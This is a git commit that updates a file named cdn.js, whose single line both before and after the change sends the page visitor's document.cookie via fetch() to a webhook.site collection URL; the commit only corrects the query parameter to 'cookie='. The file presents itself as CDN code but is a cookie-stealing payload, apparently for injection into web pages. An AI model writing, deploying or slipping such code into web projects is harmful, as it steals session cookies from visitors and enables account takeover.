14384de72ae2268a21ea630df295b7566a20fe9e
zakumi38 <95683885+zakumi38@users.noreply.github.com>
2025-03-13 18:16:55 +0900

    Update cdn.js

--- cdn.js
+++ cdn.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/15bc611f-079c-4a74-9e8a-cb221bbc902e?cookie' + document.cookie)
+fetch('https://webhook.site/15bc611f-079c-4a74-9e8a-cb221bbc902e?cookie=' + document.cookie)
